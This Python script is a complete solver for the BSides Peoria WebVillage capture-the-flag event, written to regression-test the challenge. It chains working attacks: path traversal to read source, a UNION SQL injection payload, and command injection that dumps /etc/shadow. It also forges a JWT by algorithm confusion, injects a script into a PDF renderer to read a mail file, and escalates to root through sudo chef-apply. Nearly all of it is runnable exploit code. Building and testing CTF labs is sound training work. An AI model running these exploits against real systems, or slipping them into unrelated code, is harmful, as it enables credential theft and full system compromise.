#!/usr/bin/env python3
"""End-to-end solver / path validator for the BSides Peoria WebVillage CTF.

Walks every intended step in order, performing the real request a player would
make at each stage, and captures all 8 flags. Use it to regression-test the whole
chain after changes. Read-only against a running deploy; nothing persists.

Usage:
    python3 solve.py                      # localhost + compose ports
    python3 solve.py --host 10.13.37.5    # remote / VPN target
    python3 solve.py --verbose            # also print recovered creds/secrets
    python3 solve.py --no-color           # plain output (for logs/CI)

Needs: requests, pypdf, paramiko  (pip install requests pypdf paramiko).
"""
import argparse
import base64
import hashlib
import hmac
import io
import json
import re
import secrets
import socket
import string
import sys
import threading
import time

import requests

FLAG_RE = re.compile(r'CTF\{[^}]+\}')


def find_flag(text):
    if isinstance(text, bytes):
        text = text.decode(errors='replace')
    m = FLAG_RE.search(text or "")
    return m.group(0) if m else None


def rand(n=6):
    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


# --------------------------------------------------------------------------- UI

class UI:
    COLORS = {"red": "31", "green": "32", "yellow": "33", "blue": "34",
              "magenta": "35", "cyan": "36", "dim": "2", "bold": "1"}
    FRAMES = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"

    def __init__(self, color=True, animate=True, verbose=False):
        tty = sys.stdout.isatty()
        self.color = color and tty
        self.animate = animate and tty
        self.verbose = verbose

    def c(self, text, *styles):
        if not self.color:
            return text
        codes = ";".join(self.COLORS[s] for s in styles)
        return f"\033[{codes}m{text}\033[0m"

    def title(self):
        bar = "═" * 58
        print(self.c(bar, "cyan"))
        print(self.c("  BSides Peoria WebVillage — exploit path validator", "bold", "cyan"))
        print(self.c(bar, "cyan"))

    def banner(self, n, title):
        print()
        print(self.c(f"━━━ Step {n} ", "bold", "magenta") + self.c(f"· {title}", "bold"))

    def note(self, msg):
        if self.verbose:
            print("    " + self.c("· " + msg, "dim"))

    def flag(self, value):
        print("    " + self.c("⚑ " + value, "green", "bold"))

    def act(self, msg):
        return _Action(self, msg)


class _Action:
    def __init__(self, ui, msg):
        self.ui, self.msg, self._stop, self._th = ui, msg, None, None

    def __enter__(self):
        if self.ui.animate:
            self._stop = threading.Event()
            self._th = threading.Thread(target=self._spin, daemon=True)
            self._th.start()
        return self

    def _spin(self):
        i = 0
        while not self._stop.is_set():
            frame = self.ui.FRAMES[i % len(self.ui.FRAMES)]
            sys.stdout.write(f"\r  {self.ui.c(frame, 'cyan')} {self.msg} ")
            sys.stdout.flush()
            i += 1
            self._stop.wait(0.08)

    def __exit__(self, et, ev, tb):
        mark = self.ui.c("✓", "green") if et is None else self.ui.c("✗", "red")
        if self._th:
            self._stop.set()
            self._th.join()
            clear = "\033[K" if self.ui.color else ""
            sys.stdout.write(f"\r  {mark} {self.msg}{clear}\n")
        else:
            sys.stdout.write(f"  {mark} {self.msg}\n")
        sys.stdout.flush()
        return False


# ----------------------------------------------------------------------- Solver

def ssh_run(host, port, user, password, command, timeout=120):
    import paramiko
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(host, port=port, username=user, password=password, timeout=20,
                allow_agent=False, look_for_keys=False, banner_timeout=20)
    try:
        _, stdout, stderr = cli.exec_command(command, timeout=timeout)
        return stdout.read().decode(errors='replace') + stderr.read().decode(errors='replace')
    finally:
        cli.close()


def pdf_to_text(pdf_bytes):
    from pypdf import PdfReader
    reader = PdfReader(io.BytesIO(pdf_bytes))
    return "\n".join((page.extract_text() or "") for page in reader.pages)


class Solver:
    def __init__(self, args, ui):
        self.a = args
        self.ui = ui
        self.web = f"http://{args.host}:{args.web_port}"
        self.portal = f"http://{args.host}:{args.portal_port}"
        self.ctx = {}

    # 1 — LFI reveals staff creds; staff login -> STAFF_FLAG
    def staff(self):
        with self.ui.act("GET /?template=../app.py   (LFI: read app source)"):
            r = requests.get(f"{self.web}/", params={"template": "../app.py"}, timeout=10)
        pw = re.search(r'STAFF_PASSWORD\s*=\s*"([^"]*)"', r.text).group(1)
        um = re.search(r'STAFF_USERNAME\s*=\s*"([^"]*)"', r.text)
        user = um.group(1) if um else "staff"
        self.ui.note(f"staff credential from source: {user} / {pw}")
        with self.ui.act(f"POST /login   (username={user})"):
            r2 = requests.post(f"{self.web}/login", data={"username": user, "password": pw}, timeout=10)
        return find_flag(r2.text)

    # 2 — UNION SQLi -> base64 -> admin login -> ADMIN_FLAG
    def admin(self):
        payload = "x' UNION SELECT username,2,password,4 FROM users-- -"
        with self.ui.act("GET /search?q=' UNION SELECT … FROM users--   (SQLi dump)"):
            r = requests.get(f"{self.web}/search", params={"q": payload}, timeout=10)
        admin_pw = None
        for cand in re.findall(r'[A-Za-z0-9+/]{16,}={0,2}', r.text):
            try:
                dec = base64.b64decode(cand).decode()
            except Exception:
                continue
            if dec.startswith("superepicadminpassword-"):
                self.ui.note(f"admin password (base64): {cand}")
                admin_pw = dec
                break
        self.ctx['admin_password'] = admin_pw
        self.ui.note(f"admin password (decoded): {admin_pw}")
        with self.ui.act("POST /login   (username=admin)"):
            r2 = requests.post(f"{self.web}/login", data={"username": "admin", "password": admin_pw}, timeout=10)
        return find_flag(r2.text)

    # 3 — cart + checkout parameter tampering -> CHECKOUT_FLAG
    def checkout(self):
        s = requests.Session()
        with self.ui.act("POST /add_to_cart   (item_id=1)"):
            s.post(f"{self.web}/add_to_cart", data={"item_id": "1"}, timeout=10)
        with self.ui.act("POST /checkout   (promo_valid=true  ← tampered)"):
            r = s.post(f"{self.web}/checkout", data={"promo_code": "x", "promo_valid": "true"}, timeout=10)
        return find_flag(r.text)

    # 4 — 50050 command injection -> SHELL_FLAG (+ mysterioususer shadow hash)
    def shell(self):
        with self.ui.act("TCP 50050   '1.1.1.1; cat /root/flag.txt; cat /etc/shadow'   (cmd injection)"):
            s = socket.socket()
            s.settimeout(10)
            s.connect((self.a.host, self.a.maint_port))
            s.recv(1024)  # banner
            s.sendall(b"1.1.1.1; cat /root/flag.txt; cat /etc/shadow\n")
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                data += chunk
            s.close()
        text = data.decode(errors='replace')
        m = re.search(r'^mysterioususer:(\$6\$[^:]+):', text, re.M)
        self.ctx['shadow_hash'] = m.group(1) if m else None
        self.ui.note(f"mysterioususer shadow hash: {self.ctx['shadow_hash']}")
        return find_flag(text)

    # 5 — derive reg key, register + login on portal -> SELLER_FLAG
    def seller(self):
        shadow = self.ctx.get('shadow_hash')
        admin_pw = self.ctx.get('admin_password')
        if not (shadow and admin_pw):
            raise RuntimeError("missing shadow_hash or admin_password from earlier steps")
        reg_key = hashlib.shake_256((shadow + admin_pw).encode()).hexdigest(64)
        self.ui.note(f"reg key = SHAKE256(shadow + admin_pw) = {reg_key[:32]}…")
        u, p = "solver_" + rand(), "Pw_" + rand(8)
        self.ctx['seller_user'] = u
        s = requests.Session()
        with self.ui.act(f"POST /register   (username={u}, registration_key=…)"):
            s.post(f"{self.portal}/register",
                   data={"username": u, "password": p, "registration_key": reg_key}, timeout=15)
        with self.ui.act(f"POST /login   (new seller {u})"):
            r = s.post(f"{self.portal}/login", data={"username": u, "password": p}, timeout=15)
        return find_flag(r.text)

    # 6 — JWT RS256->HS256 confusion -> PORTAL_ADMIN_FLAG
    def portal_admin(self):
        with self.ui.act("GET /jwt/public.pem   (fetch RS256 public key)"):
            pub = requests.get(f"{self.portal}/jwt/public.pem", timeout=10).content
        user = self.ctx.get('seller_user', 'solver')
        h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')).encode())
        pl = b64u(json.dumps({"username": user, "role": "admin"}, separators=(',', ':')).encode())
        si = f"{h}.{pl}"
        token = f"{si}." + b64u(hmac.new(pub, si.encode(), hashlib.sha256).digest())
        self.ui.note("forged HS256 token {\"role\":\"admin\"} signed with the public key")
        s = requests.Session()
        s.cookies.set("session_token", token)
        self.ctx['admin_session'] = s
        with self.ui.act("GET /admin   (forged admin JWT cookie)"):
            r = s.get(f"{self.portal}/admin", timeout=10)
        return find_flag(r.text)

    # 7 — invoice PDF LFI -> /var/mail/jdoe -> SSH -> USER_FLAG
    def user_flag(self):
        s = self.ctx.get('admin_session')
        if s is None:
            raise RuntimeError("no admin JWT session from step 6")
        payload = ('<script>x=new XMLHttpRequest();'
                   'x.onload=function(){document.write(this.responseText)};'
                   'x.open("GET","file:///var/mail/jdoe");x.send();</script>')
        data = {"client_name": "Acme", "client_email": "a@b.test",
                "item_desc": "x", "item_qty": "1", "item_price": "1", "notes": payload}
        with self.ui.act("POST /admin/invoices/pdf   (inject <script> file:// LFI into Notes)"):
            r = s.post(f"{self.portal}/admin/invoices/pdf", data=data, timeout=90)
            if r.headers.get("Content-Type") != "application/pdf":
                raise RuntimeError(f"PDF render failed: {r.status_code} {r.text[:200]}")
            text = pdf_to_text(r.content)
        m = re.search(r'(ssh-[A-Za-z0-9]{10,})', text)
        if not m:
            raise RuntimeError("SSH password not found in rendered PDF (LFI may have failed)")
        jdoe_pw = m.group(1)
        self.ctx['jdoe_password'] = jdoe_pw
        self.ui.note(f"jdoe SSH password from PDF LFI: {jdoe_pw}")
        with self.ui.act(f"SSH jdoe@{self.a.host}:{self.a.ssh_port}   cat ~/user.txt"):
            out = ssh_run(self.a.host, self.a.ssh_port, "jdoe", jdoe_pw, "cat ~/user.txt")
        return find_flag(out)

    # 8 — sudo chef-apply privesc -> ROOT_FLAG
    def root_flag(self):
        jdoe_pw = self.ctx.get('jdoe_password')
        if not jdoe_pw:
            raise RuntimeError("no jdoe password from step 7")
        # chef-apply only takes --chef-license AFTER the recipe file; the flag is a
        # no-op once the image has pre-accepted the license.
        cmd = (
            "cat > /tmp/pwn.rb <<'RB'\n"
            "execute 'pwn' do\n"
            "  command 'cat /root/root.txt > /tmp/rootflag && chmod 644 /tmp/rootflag'\n"
            "end\n"
            "RB\n"
            "sudo chef-apply /tmp/pwn.rb --chef-license accept >/dev/null 2>&1; cat /tmp/rootflag"
        )
        with self.ui.act("SSH jdoe   write recipe + sudo chef-apply   (Chef GTFOBin → root)"):
            out = ssh_run(self.a.host, self.a.ssh_port, "jdoe", jdoe_pw, cmd, timeout=150)
        return find_flag(out)

    def run(self):
        self.ui.title()
        print(f"\nTarget  web={self.web}  portal={self.portal}  "
              f"maint={self.a.host}:{self.a.maint_port}  ssh={self.a.host}:{self.a.ssh_port}")
        steps = [
            ("STAFF_FLAG", "LFI → staff login", self.staff),
            ("ADMIN_FLAG", "UNION SQLi → base64 → admin login", self.admin),
            ("CHECKOUT_FLAG", "checkout parameter tampering", self.checkout),
            ("SHELL_FLAG", "port 50050 command injection", self.shell),
            ("SELLER_FLAG", "reg-key lock → register/login", self.seller),
            ("PORTAL_ADMIN_FLAG", "JWT RS256→HS256 confusion", self.portal_admin),
            ("USER_FLAG", "PDF LFI → /var/mail → SSH foothold", self.user_flag),
            ("ROOT_FLAG", "sudo chef-apply privesc", self.root_flag),
        ]
        captured = {}
        for i, (name, title, fn) in enumerate(steps, 1):
            self.ui.banner(i, f"{name}  ({title})")
            try:
                flag = fn()
            except Exception as e:
                flag = None
                self.ui.note(f"error: {e.__class__.__name__}: {e}")
            if flag:
                captured[name] = flag
                self.ui.flag(flag)
            else:
                print("    " + self.ui.c("✗ no flag captured", "red", "bold"))

        print()
        print(self.ui.c("─" * 58, "cyan"))
        ok = len(captured)
        for name, _t, _fn in steps:
            mark = self.ui.c("✓", "green") if name in captured else self.ui.c("✗", "red")
            val = captured.get(name, self.ui.c("MISSING", "red"))
            print(f"  {mark} {name:<18} {val}")
        color = "green" if ok == len(steps) else "red"
        print(self.ui.c(f"\n  {ok}/{len(steps)} flags captured.", color, "bold"))
        return ok == len(steps)


def main():
    p = argparse.ArgumentParser(description="BSides WebVillage CTF path validator")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--web-port", type=int, default=8888)
    p.add_argument("--portal-port", type=int, default=8889)
    p.add_argument("--maint-port", type=int, default=50050)
    p.add_argument("--ssh-port", type=int, default=50022)
    p.add_argument("--verbose", action="store_true", help="print recovered creds/secrets")
    p.add_argument("--no-color", action="store_true", help="disable color/animations")
    args = p.parse_args()
    ui = UI(color=not args.no_color, animate=not args.no_color, verbose=args.verbose)
    sys.exit(0 if Solver(args, ui).run() else 1)


if __name__ == "__main__":
    main()
